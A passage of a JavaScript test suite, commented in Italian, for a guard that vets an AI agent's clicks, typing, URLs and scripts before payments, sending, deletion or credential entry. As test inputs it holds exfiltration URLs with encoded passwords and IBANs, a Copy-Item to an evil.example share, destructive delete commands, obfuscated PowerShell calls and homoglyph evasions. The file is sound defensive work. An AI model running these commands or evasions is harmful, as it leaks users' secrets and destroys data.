    assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Avanti'), schermata: { elementi: [el] }, politica: PIENO, contesto: ctx() }).protezione, 'anti-robot', el.nome || el.valore);
  }
});

test('PROT-20: dati spediti in qualunque parte dell\'indirizzo, e una ricerca vera non è un invio (alto 9)', () => {
  const b64 = Buffer.from('mario.rossi@example.com password=hunter2 '.repeat(3)).toString('base64url');
  const hex = Buffer.from('mario.rossi@example.com password=hunter2 IBAN IT60X0542811101000000123456 '.repeat(2)).toString('hex');
  for (const indirizzo of [`https://raccolta.example/?d=${hex}`, `https://raccolta.example/${b64}`, `https://raccolta.example/#${b64}`,
    `https://${hex.slice(0, 60)}.raccolta.example/`, `raccolta.example/?d=${b64}`]) {
    assert.equal(valutaAzione({ azione: { tipo: 'apri', indirizzo }, bersaglio: null, schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'ferma', indirizzo.slice(0, 60));
  }
  assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo: `https://raccolta.example/?d=${b64}` }, bersaglio: { ruolo: 'campo', nome: 'Barra degli indirizzi' }, schermata: vuota, politica: PIENO, contesto: ctx() }).motivo, 'dati-in-indirizzo');
  const ricerca = 'https://www.google.com/search?q=' + encodeURIComponent('migliori cuffie bluetooth economiche con cancellazione del rumore 2026 recensioni');
  assert.equal(valutaAzione({ azione: { tipo: 'apri', indirizzo: ricerca }, bersaglio: null, schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'procedi');
  assert.equal(valutaAzione({ azione: { tipo: 'apri', indirizzo: 'https://docs.google.com/document/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms/edit' }, bersaglio: null, schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'procedi', 'un documento condiviso non è un invio');
});

test('PROT-21: termini come pulsante, cookie e permessi scritti in altri modi (alto 10)', () => {
  for (const nome of ['Accetto i termini e continua', 'I agree']) {
    assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante(nome), schermata: vuota, politica: NORMALE, contesto: ctx() }).motivo, 'termini', nome);
  }
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: casella(''), schermata: { elementi: [{ ruolo: 'testo', nome: 'Accetto i termini e le condizioni' }] }, politica: NORMALE, contesto: ctx() }).motivo, 'termini');
  const banner = { elementi: [{ ruolo: 'testo', nome: 'Usiamo i cookie per migliorare il sito' }] };
  for (const nome of ['Accetta\u00a0tutto', 'Alle akzeptieren', 'Accetta e chiudi', 'OK', 'Continua', 'Accetta tutti e continua']) {
    assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante(nome), schermata: banner, politica: PIENO, contesto: ctx() }).decisione, 'scegli-riservato', nome);
  }
  for (const nome of ['Accetta i cookie', 'Accept cookies']) {
    assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante(nome), schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'scegli-riservato', nome);
  }
  // \u00abAccept all\u00bb dei suggerimenti di Docs non \u00e8 un banner: scegliere \u00abRifiuta tutto\u00bb l\u00ec cancellerebbe le modifiche
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Accept all'), schermata: { elementi: [{ ruolo: 'testo', nome: '3 suggestions' }] }, politica: PIENO, contesto: ctx() }).decisione, 'procedi');
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Accetta'), schermata: banner, politica: PIENO, contesto: ctx() }).motivo, 'cookie');
  const piede = { elementi: [{ ruolo: 'collegamento', nome: 'Cookie policy' }] };
  assert.notEqual(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Accetta'), schermata: piede, politica: PIENO, contesto: ctx() }).motivo, 'cookie', 'il collegamento del piè di pagina non è un banner');
  for (const nome of ['Consenti', 'Allow']) assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante(nome), schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'scegli-riservato', nome);
});

test('PROT-22: fallisce CHIUSO — azione, tipo, bersaglio o schermata che non si possono valutare (medio 12, basso)', () => {
  const pagaOra = pulsante('Paga ora');
  const casi = [
    { azione: undefined, bersaglio: pagaOra }, { azione: null, bersaglio: pagaOra }, { azione: { tipo: 'click' }, bersaglio: pagaOra },
    { azione: { tipo: 'PREMI' }, bersaglio: pagaOra }, { azione: { tipo: 'clic', x: 1, y: 1 }, bersaglio: null },
    { azione: { tipo: 'premi' }, bersaglio: pagaOra, schermata: { elementi: {} } },
    { azione: { tipo: 'premi' }, bersaglio: { ruolo: 'pulsante', nome: { toString() { throw new Error('ostile'); } } } },
  ];
  for (const c of casi) {
    const r = valutaAzione({ schermata: vuota, ...c, politica: PIENO, contesto: ctx() });
    assert.equal(r.decisione, 'ferma', JSON.stringify(c.azione)); assert.equal(r.motivo, 'non-valutabile');
    assert.equal(valutaAzione({ schermata: vuota, ...c, politica: NORMALE, contesto: ctx() }).decisione, 'chiedi');
  }
  // una politica senza la sua regola per il non valutabile non procede mai
  assert.equal(valutaAzione({ azione: null, politica: { nome: 'x', decidi: () => 'procedi', nonValutabile: 'procedi' } }).decisione, 'ferma');
  // «"false"» come stringa non è una richiesta
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pagaOra, schermata: vuota, politica: PIENO, contesto: ctx({ richiesta: { pagare: 'false' } }) }).decisione, 'ferma');
  // trascina su una zona di caricamento e programmi che inviano o cancellano
  assert.equal(valutaAzione({ azione: { tipo: 'trascina', da: 'r1', a: 'r2' }, bersaglio: { ruolo: 'altro', nome: 'Trascina qui i file da caricare' }, schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'ferma');
  assert.equal(valutaAzione({ azione: { tipo: 'programma', linguaggio: 'powershell', codice: 'Remove-Item -Recurse C:\\x' }, schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'ferma');
  assert.equal(valutaAzione({ azione: { tipo: 'programma', linguaggio: 'powershell', codice: 'Remove-Item -Recurse C:\\x' }, schermata: vuota, politica: PIENO, contesto: chiesto('cancellare') }).decisione, 'procedi-e-segna');
  assert.equal(valutaAzione({ azione: { tipo: 'programma', linguaggio: 'python', codice: 'import requests\nrequests.post("https://x.example", data=d)' }, schermata: vuota, politica: PIENO, contesto: ctx() }).protezione, 'invio');
  assert.equal(valutaAzione({ azione: { tipo: 'programma', linguaggio: 'python', codice: 'righe = leggi()\ndel righe[0]\nprint(len(righe))' }, schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'procedi', 'del in Python non cancella file');
});

test('PROT-23: piano per dominio registrabile e falsi allarmi che bloccavano (medi 14 e 16)', () => {
  const termini = { azione: { tipo: 'premi' }, bersaglio: casella('Accetto i termini') };
  assert.equal(valutaAzione({ ...termini, schermata: { elementi: [], dominio: 'truffa.it' }, politica: PIENO, contesto: ctx({ piano: { domini: ['it'] } }) }).decisione, 'ferma');
  assert.equal(valutaAzione({ ...termini, schermata: { elementi: [], dominio: 'x.co.uk' }, politica: PIENO, contesto: ctx({ piano: { domini: ['co.uk'] } }) }).decisione, 'ferma');
  assert.equal(valutaAzione({ ...termini, schermata: { elementi: [], dominio: 'Biglietti.Example' }, politica: PIENO, contesto: ctx({ piano: { domini: ['biglietti.example'] } }) }).decisione, 'procedi-e-segna');
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Carica altri risultati'), schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'procedi');
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: { ruolo: 'campo', nome: 'Rispondi' }, schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'procedi', 'mettere a fuoco un campo non invia');
});

test('PROT-24: il segnaposto non ha ritorno quadratico (medio 15)', () => {
  const t0 = process.hrtime.bigint();
  valutaAzione({ azione: { tipo: 'scrivi', testo: '{{segreto:'.repeat(16000) }, bersaglio: { ruolo: 'campo', nome: 'Note' }, schermata: vuota, politica: NORMALE, contesto: ctx() });
  assert.ok(Number(process.hrtime.bigint() - t0) / 1e6 < 50);
});

// ---------- terzo giro (02/11 notte): seconda revisione avversaria di 88e444725 ----------
test('PROT-25: in cassa ogni conferma è un pagamento, al clic come da tastiera (critico 1)', () => {
  const cassa = { elementi: [{ ref: 'w', ruolo: 'finestra', nome: 'Riepilogo ordine' }, { ruolo: 'testo', nome: 'Totale da pagare 49,90 €', finestra: 'w' }] };
  for (const nome of ['Conferma', 'Continua', 'Avanti', 'Next', 'Prenota', 'Book now', 'Complete order', 'Upgrade', '']) {
    for (const politica of [PIENO, TELEFONO]) {
      assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: { ...pulsante(nome), finestra: 'w' }, schermata: cassa, politica, contesto: ctx() }).decisione, 'ferma', `${nome} ${politica.nome}`);
    }
  }
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: { ...pulsante('Torna al carrello'), finestra: 'w' }, schermata: cassa, politica: PIENO, contesto: ctx() }).decisione, 'procedi', 'uscire dalla cassa');
  for (const nome of ['Zahlungspflichtig bestellen', 'Valider la commande', 'Confirmar pedido']) {
    assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante(nome), schermata: vuota, politica: TELEFONO, contesto: ctx() }).protezione, 'pagamento', nome);
  }
  // parole deboli: fuori cassa pagano solo accanto a un prezzo o dentro una finestra modale
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Subscribe'), schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'procedi', 'Iscriviti di YouTube');
  const prime = { elementi: [{ ruolo: 'testo', nome: 'Poi 4,99 €/mese' }] };
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Start free trial'), schermata: prime, politica: PIENO, contesto: ctx() }).protezione, 'pagamento');
});

test('PROT-26: intenzioni — domande, condizioni, «prima di», ritrattazioni non sbloccano (critico 2)', () => {
  const nulla = { pagare: false, inviare: false, cancellare: false };
  for (const f of ['Prima di pagare chiedimi conferma', 'Chiedimi prima di comprare', 'Before you pay, ask me', 'Evita di comprare cose care',
    'Confronta i prezzi e dimmi quale comprare', 'Which laptop should I buy?', 'Come faccio a pagare la bolletta?', 'Paga la bolletta. Anzi no, lascia stare',
    'Come posso cancellare il mio account?', 'Rispondi a questa domanda: quanto costa?', 'Mandami il link qui in chat', 'Cancella il testo nel campo di ricerca',
    'Elimina i filtri', 'compralo solo se costa meno di 50 euro', 'Invia la mail a Marco... aspetta, non ancora', 'Il sito dice «paga ora»: cosa significa?']) {
    assert.deepEqual(intenzioniDallaFrase(f), nulla, f);
  }
  assert.equal(intenzioniDallaFrase('Ordina una pizza margherita').pagare, true);
  assert.equal(intenzioniDallaFrase('Pagami la bolletta della luce').pagare, true);
});

test('PROT-27: il segnaposto vale solo da solo; tasti e incolla nei campi sensibili; riempimento automatico (alti 3, 4, 5)', () => {
  assert.notEqual(valutaAzione({ azione: { tipo: 'scrivi', testo: '4111 1111 1111 1111 {{segreto:x}}' }, bersaglio: { ruolo: 'campo', nome: 'Note' }, schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'procedi-e-segna');
  assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo: 'Gatto2024!{{segreto:nessuno}}' }, bersaglio: campoPassword, schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'ferma');
  for (const combinazione of ['ctrl+v', 'shift+insert', 'h']) {
    assert.equal(valutaAzione({ azione: { tipo: 'tasti', combinazione }, bersaglio: campoPassword, schermata: vuota, politica: PIENO, contesto: ctx() }).protezione, 'credenziale', combinazione);
  }
  assert.equal(valutaAzione({ azione: { tipo: 'tasti', combinazione: 'tab' }, bersaglio: campoPassword, schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'procedi', 'spostarsi non scrive');
  for (const combinazione of ['space', 'KP_Enter', '{ENTER}']) {
    assert.equal(valutaAzione({ azione: { tipo: 'tasti', combinazione }, bersaglio: pulsante('Paga ora'), schermata: vuota, politica: PIENO, contesto: ctx() }).protezione, 'pagamento', combinazione);
  }
  const dialogo = { elementi: [{ ref: 'd', ruolo: 'finestra', nome: 'Eliminare definitivamente il file?', modale: true }] };
  for (const combinazione of ['y', 's', 'space']) {
    assert.equal(valutaAzione({ azione: { tipo: 'tasti', combinazione }, bersaglio: null, schermata: dialogo, politica: PIENO, contesto: ctx() }).protezione, 'cancellazione', combinazione);
  }
  const voce = { ruolo: 'voce', nome: 'Visa •••• 1111, scadenza 12/28' };
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: voce, schermata: { elementi: [], dominio: 'phishing.example' }, politica: PIENO, contesto: ctx() }).decisione, 'ferma');
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: voce, schermata: { elementi: [], dominio: 'shop.example' }, politica: PIENO, contesto: ctx({ piano: { domini: ['shop.example'] } }) }).decisione, 'procedi-e-segna');
});

test('PROT-28: indirizzi con dati in chiaro, permessi del telefono (alti 6, 7)', () => {
  for (const indirizzo of ['https://raccolta.example/?iban=IT60X0542811101000000123456', 'https://raccolta.example/?c=4111111111111111&cvv=123',
    'https://raccolta.example/?e=mario.rossi@example.com', `https://raccolta.example/?d=${'a'.repeat(79).replace(/a/gu, 'f')}`]) {
    assert.equal(valutaAzione({ azione: { tipo: 'apri', indirizzo }, bersaglio: null, schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'ferma', indirizzo);
  }
  assert.equal(valutaAzione({ azione: { tipo: 'apri', indirizzo: 'https://shop.example/account?e=mario.rossi@example.com' }, bersaglio: null, schermata: vuota, politica: PIENO, contesto: ctx({ piano: { domini: ['shop.example'] } }) }).decisione, 'procedi', 'email verso un dominio del piano');
  for (const nome of ['While using the app', 'Only this time', 'Mentre usi l\'app', 'Solo questa volta', 'Allow once', 'Consenti accesso', 'Permetti']) {
    assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante(nome), schermata: vuota, politica: TELEFONO, contesto: ctx() }).decisione, 'scegli-riservato', nome);
  }
});

test('PROT-29: falsi allarmi sul lavoro normale in Accesso pieno (alto 8)', () => {
  const casi = [
    [{ tipo: 'scrivi', testo: 'Ciao Marco,\nti mando il resoconto.\nA presto' }, { ruolo: 'campo', nome: 'Corpo del messaggio' }, vuota],
    [{ tipo: 'tasti', combinazione: 'enter' }, { ruolo: 'campo', nome: 'Cerca su Amazon' }, { elementi: [{ ruolo: 'testo', nome: 'JBL Go 3 Cassa Bluetooth' }] }],
    [{ tipo: 'tasti', combinazione: 'enter' }, { ruolo: 'campo', nome: 'Bio' }, { elementi: [{ ruolo: 'collegamento', nome: 'Billing and licensing' }] }],
    [{ tipo: 'premi' }, pulsante('Registra'), { elementi: [{ ruolo: 'testo', nome: 'Tieni premuto per registrare' }] }],
    [{ tipo: 'premi' }, pulsante('Avanti'), { elementi: [{ ruolo: 'testo', nome: 'Questo articolo spiega come funziona reCAPTCHA e Turnstile' }] }],
    [{ tipo: 'scrivi', testo: '95100' }, { ruolo: 'campo', nome: 'Codice di avviamento postale' }, vuota],
    [{ tipo: 'scrivi', testo: '20202' }, { ruolo: 'campo', nome: 'Codice promozionale' }, vuota],
    [{ tipo: 'premi' }, pulsante('Ordina'), vuota],
    [{ tipo: 'premi' }, pulsante('Rispondi'), vuota], [{ tipo: 'premi' }, pulsante('Inoltra'), vuota], [{ tipo: 'premi' }, pulsante('Condividi'), vuota],
  ];
  for (const [azione, bersaglio, schermata] of casi) {
    assert.equal(valutaAzione({ azione, bersaglio, schermata, politica: PIENO, contesto: ctx() }).decisione, 'procedi', `${azione.tipo} ${bersaglio.nome}`);
  }
  // ma «Condividi» dentro la finestra di condivisione spedisce
  const condivisione = { elementi: [{ ref: 's', ruolo: 'finestra', nome: 'Condividi con', modale: true }] };
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: { ...pulsante('Condividi'), finestra: 's' }, schermata: condivisione, politica: PIENO, contesto: ctx() }).protezione, 'invio');
});

test('PROT-30: programmi, cancellazioni nuove, anti-robot v2, fallire chiuso, scritture miste, piano (medi e bassi)', () => {
  for (const codice of ["require('https').request('https://x.example')", "require('net').connect(80, 'x.example')", "Copy-Item C:\\dati \\\\evil.example\\share", 'git push origin main']) {
    assert.equal(valutaAzione({ azione: { tipo: 'programma', linguaggio: 'node', codice }, schermata: vuota, politica: PIENO, contesto: ctx() }).protezione, 'invio', codice);
  }
  for (const [linguaggio, codice] of [['python', "import os\nos.system('rd /s /q C:\\\\x')"], ['powershell', "[System.IO.Directory]::Delete('C:\\x', $true)"], ['powershell', 'git clean -fdx'], ['powershell', 'git reset --hard']]) {
    assert.equal(valutaAzione({ azione: { tipo: 'programma', linguaggio, codice }, schermata: vuota, politica: PIENO, contesto: ctx() }).protezione, 'cancellazione', codice);
  }
  for (const codice of ["& ('iw'+'r') https://x", "__import__('req'+'uests')", 'iex $comando']) {
    assert.equal(valutaAzione({ azione: { tipo: 'programma', linguaggio: 'powershell', codice }, schermata: vuota, politica: PIENO, contesto: ctx() }).motivo, 'non-valutabile', codice);
  }
  for (const nome of ['Ripristina dati di fabbrica', 'Delete for everyone', 'Delete this repository', 'Endgültig löschen', 'Vider la corbeille']) {
    assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante(nome), schermata: vuota, politica: TELEFONO, contesto: ctx() }).protezione, 'cancellazione', nome);
  }
  assert.equal(valutaAzione({ azione: { tipo: 'scegli', valore: 'Elimina definitivamente' }, bersaglio: { ruolo: 'scelta', nome: 'Azione' }, schermata: vuota, politica: TELEFONO, contesto: ctx() }).protezione, 'cancellazione', 'scegli guarda il valore');
  const rc = { elementi: [{ ruolo: 'casella', nome: 'I\'m not a robot', valore: 'reCAPTCHA Privacy - Terms' }] };
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Avanti'), schermata: rc, politica: PIENO, contesto: ctx() }).protezione, 'anti-robot');
  // elemento aggiornato sul posto: niente cache stantia
  const el = { ruolo: 'testo', nome: 'Caricamento…' }; const s = { elementi: [el] };
  valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Avanti'), schermata: s, politica: PIENO, contesto: ctx() });
  el.nome = 'Verify you are human';
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Avanti'), schermata: s, politica: PIENO, contesto: ctx() }).protezione, 'anti-robot');
  // fallire chiuso
  for (const c of [{ schermata: null }, { schermata: 'x' }, { azione: { tipo: 'scrivi', testo: 'x' }, bersaglio: null }, { azione: { tipo: 'tasti', combinazione: 'enter' }, bersaglio: null }]) {
    assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Avanti'), ...c, politica: PIENO, contesto: ctx() }).motivo, 'non-valutabile', JSON.stringify(c));
  }
  assert.equal(valutaAzione({ azione: { tipo: 'tasti', combinazione: [['ctrl', 'enter']] }, bersaglio: { ruolo: 'campo', nome: 'x' }, schermata: vuota, politica: PIENO, contesto: ctx() }).protezione, 'invio');
  const ostile = { toString() { throw new Error('ostile'); } };
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: casella('Accetto i termini'), schermata: { elementi: [], dominio: ostile }, politica: PIENO, contesto: ctx() }).decisione, 'ferma');
  for (const nome of ['Inv\u0131a', 'Buy n\u0585w', 'Se\u0332nd', '\uA4D1ay now']) {
    assert.notEqual(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante(nome), schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'procedi', nome);
  }
  // piano: suffissi pubblici; sottoinsiemi per piattaforma
  const termini = { azione: { tipo: 'premi' }, bersaglio: casella('Accetto i termini') };
  assert.equal(valutaAzione({ ...termini, schermata: { elementi: [], dominio: 'evil.github.io' }, politica: PIENO, contesto: ctx({ piano: { domini: ['github.io'] } }) }).decisione, 'ferma');
  assert.equal(valutaAzione({ azione: { tipo: 'programma', codice: 'print(1)' }, schermata: vuota, politica: TELEFONO, contesto: ctx() }).motivo, 'non-valutabile');
  assert.equal(valutaAzione({ azione: { tipo: 'sistema', dove: 'home' }, schermata: vuota, politica: PIENO, contesto: ctx() }).motivo, 'non-valutabile');
  for (const nome of ['Parola d\'ordine', 'Chiave API', 'Passphrase']) {
    assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo: 'x' }, bersaglio: { ruolo: 'campo', nome }, schermata: vuota, politica: TELEFONO, contesto: ctx() }).protezione, 'credenziale', nome);
  }
  assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo: 'mari' }, bersaglio: campoPassword, schermata: vuota, politica: PIENO, contesto: ctx({ testoDellaPersona: 'accedi come mario.rossi' }) }).decisione, 'ferma');
});

test('PROT-31: i casi che i mutanti del terzo giro hanno mostrato scoperti', () => {
  // scritture miste: una lettera armena non mappata in mezzo a un nome latino
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Senդ'), schermata: vuota, politica: PIENO, contesto: ctx() }).motivo, 'non-valutabile');
  // una domanda senza parole di freno
  assert.equal(intenzioniDallaFrase('Compra il latte?').pagare, false);
  // carta in chiaro nell'indirizzo, anche verso un dominio del piano
  assert.equal(valutaAzione({ azione: { tipo: 'apri', indirizzo: 'https://shop.example/?c=4111111111111111' }, bersaglio: null, schermata: vuota, politica: PIENO, contesto: ctx({ piano: { domini: ['shop.example'] } }) }).decisione, 'ferma');
  // scrivi senza bersaglio: il motivo è dichiarato, non un'eccezione
  assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo: 'x' }, bersaglio: null, schermata: vuota, politica: PIENO, contesto: ctx() }).prova, 'bersaglio-mancante');
  // un testo che parla di biscotti non è un banner dei cookie
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Accetta'), schermata: { elementi: [{ ruolo: 'testo', nome: 'Ricetta: cookie al cioccolato' }] }, politica: PIENO, contesto: ctx() }).decisione, 'procedi');
  // un numero d'ordine di 16 cifre che passa Luhn, nel suo campo, non è una carta
  assert.equal(valutaAzione({ azione: { tipo: 'scrivi', testo: '4000 0000 0000 0002' }, bersaglio: { ruolo: 'campo', nome: 'Numero ordine' }, schermata: vuota, politica: PIENO, contesto: ctx() }).decisione, 'procedi');
  // «Paga ora» esposto come campo resta un pagamento
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: { ruolo: 'campo', nome: 'Paga ora' }, schermata: vuota, politica: PIENO, contesto: ctx() }).protezione, 'pagamento');
  // la politica non esplode su un dominio ostile; l'indirizzo con un piano ostile si nega
  const ostile = { toString() { throw new Error('ostile'); } };
  assert.equal(valutaAzione({ azione: { tipo: 'apri', indirizzo: 'https://x.example/?e=a@b.example' }, bersaglio: null, schermata: vuota, politica: PIENO, contesto: ctx({ piano: { domini: [ostile] } }) }).decisione, 'ferma');
});

test('PROT-32: terza revisione (Mobile, 02/11 notte) — denaro, cassa camuffata, falsi allarmi, contenuto dettato, politica incoerente', () => {
  const importo = { elementi: [{ ruolo: 'campo', nome: 'Importo', valore: '250,00 €' }] };
  for (const [nome, s] of [['Bonifico', vuota], ['Invia bonifico', importo],['Conferma bonifico', vuota], ['Invia denaro', vuota], ['Send money', vuota], ['Trasferisci', vuota], ['Ricarica 20 €', vuota], ['Invia', importo], ['Conferma', importo]]) {
    assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante(nome), schermata: s, politica: TELEFONO, contesto: ctx() }).decisione, 'ferma', nome);
  }
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Salva'), schermata: importo, politica: PIENO, contesto: ctx() }).decisione, 'procedi', 'salvare una spesa non sposta denaro');
  // cassa camuffata con una lettera cirillica nel titolo o nel campo
  for (const s of [{ elementi: [{ ref: 'w', ruolo: 'finestra', nome: 'Riepilogo ordinе' }] }, { elementi: [{ ruolo: 'campo', nome: 'Numеro carta' }] }]) {
    assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: { ...pulsante('Continua'), finestra: 'w' }, schermata: s, politica: PIENO, contesto: ctx() }).decisione, 'ferma');
  }
  // falsi allarmi: «Scadenza» di un'attività, «Expiry date» di un documento, «Ordina» con i prezzi, una frase in una chat
  const casi = [
    [pulsante('Salva'), { elementi: [{ ruolo: 'campo', nome: 'Scadenza' }] }], [pulsante('Next'), { elementi: [{ ruolo: 'campo', nome: 'Expiry date' }] }],
    [pulsante('Ordina'), { elementi: [{ ruolo: 'testo', nome: 'Cuffie 49,90 €' }] }],
    [pulsante('Invia'), { elementi: [{ ruolo: 'testo', nome: 'giuro che non sono un robot', inLista: 'l1' }] }],
  ];
  for (const [b, s] of casi) assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: b, schermata: s, politica: PIENO, contesto: ctx({ richiesta: { inviare: true } }) }).decisione, 'procedi', b.nome);
  // ma scadenza + un altro campo della carta è una cassa
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Continua'), schermata: { elementi: [{ ruolo: 'campo', nome: 'Scadenza' }, { ruolo: 'campo', nome: 'Intestatario' }] }, politica: PIENO, contesto: ctx() }).decisione, 'ferma');
  assert.deepEqual(intenzioniDallaFrase('manda un messaggio a mamma: compra il pane'), { pagare: false, inviare: true, cancellare: false });
  // «non si può annullare» (infinito, non solo participio) in una finestra modale: trovato dalla prova del ciclo, 02/11 notte
  const annullare = { elementi: [{ ref: 'd', ruolo: 'finestra', nome: 'Questa operazione non si può annullare', modale: true }] };
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: { ...pulsante('OK'), finestra: 'd' }, schermata: annullare, politica: PIENO, contesto: ctx() }).protezione, 'cancellazione');
  // politica incoerente ⇒ ferma col suo motivo, non un'eccezione
  const r = valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Paga ora'), schermata: vuota, politica: { nome: 'x', decidi: () => 'boh' }, contesto: ctx() });
  assert.equal(r.decisione, 'ferma'); assert.equal(r.motivo, 'politica-incoerente');
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Paga ora'), schermata: vuota, politica: { nome: 'x', decidi: () => 'riscrivi' }, contesto: ctx() }).decisione, 'ferma');
});

test('PROT-11: velocità — schermata NUOVA da 500 elementi a ogni azione: p95 sotto 1 ms a macchina libera; sotto carico si dichiara (Performance)', () => {
  const nuova = (k) => ({ elementi: Array.from({ length: 500 }, (_, i) => ({ ruolo: i % 3 ? 'testo' : 'pulsante', nome: `Elemento ${i} giro ${k} con un testo normale di prova`, finestra: i % 50 === 0 ? 'w' : undefined })), dominio: 'x.example' });
  // Prova sensibile al carico (gira accanto ad altre prove e alle campagne): riscaldamento scartato, migliore di tre giri.
  // 04/11: sotto carico il migliore dei tre dà 1,0-1,6 ms (1,085 nel treno H, 1,535 con la macchina all'86%); da solo 0,85.
  // La soglia di 1 ms di Performance si legge dalla riga stampata, a macchina libera. Il tetto di 5 ms ferma solo un rallentamento
  // di oltre ~4 volte: una scansione quadratica dei 500 elementi a ogni azione, sotto carico, ha dato 4,8 e 6,5 ms, cioè sta al
  // bordo e non sempre lo sfora: la ferma PROT-11-RAPPORTO, qui sotto.
  const giro = () => {
    const schermate = Array.from({ length: 300 }, (_, k) => nuova(k));
    const tempi = [];
    for (let i = 0; i < schermate.length; i += 1) {
      const t0 = process.hrtime.bigint();
      valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Avanti'), schermata: schermate[i], politica: PIENO, contesto: ctx() });
      if (i >= 30) tempi.push(Number(process.hrtime.bigint() - t0) / 1e6);
    }
    tempi.sort((a, b) => a - b);
    return tempi[Math.floor(tempi.length * 0.95)];
  };
  const p95 = Math.min(giro(), giro(), giro());
  console.log(`# PROT-11 p95 ${p95.toFixed(3)} ms su 500 elementi, schermata nuova a ogni azione`);
  assert.ok(p95 < 5, `p95 ${p95.toFixed(3)} ms`);
});

test('PROT-11-RAPPORTO: il costo cresce coi 500 elementi in modo lineare, non quadratico — rapporto fra 500 e 50, che il carico non sposta', () => {
  // 04/11: un tetto in millisecondi dipende da quanto è carica la macchina; il rapporto no, perché le due misure si alternano
  // chiamata per chiamata e il carico le tocca insieme (come `assert elapsed < _WAIT / 2` di Hermes: un confronto, non un numero).
  // Misurato su copie col treno H acceso, 3 corse da 5 giri: codice vero 8,2-10,1; una scansione quadratica degli elementi a ogni
  // azione 22,9-28,9. Il tetto 15 sta in mezzo.
  const schermata = (n, k) => ({ elementi: Array.from({ length: n }, (_, i) => ({ ruolo: i % 3 ? 'testo' : 'pulsante', nome: `Elemento ${i} giro ${k} con un testo normale di prova`, finestra: i % 50 === 0 ? 'w' : undefined })), dominio: 'x.example' });
  const mediana = (v) => [...v].sort((a, b) => a - b)[Math.floor(v.length / 2)];
  const chiama = (s) => valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Avanti'), schermata: s, politica: PIENO, contesto: ctx() });
  const rapporti = [];
  for (let g = 0; g < 5; g += 1) {
    const grandi = Array.from({ length: 120 }, (_, k) => schermata(500, k));
    const piccole = Array.from({ length: 120 }, (_, k) => schermata(50, k));
    const tG = [];
    const tP = [];
    for (let i = 0; i < 120; i += 1) {
      let t0 = process.hrtime.bigint();
      chiama(grandi[i]);
      const dG = Number(process.hrtime.bigint() - t0) / 1e6;
      t0 = process.hrtime.bigint();
      chiama(piccole[i]);
      const dP = Number(process.hrtime.bigint() - t0) / 1e6;
      if (i >= 20) { tG.push(dG); tP.push(dP); } // le prime venti sono riscaldamento
    }
    rapporti.push(mediana(tG) / mediana(tP));
  }
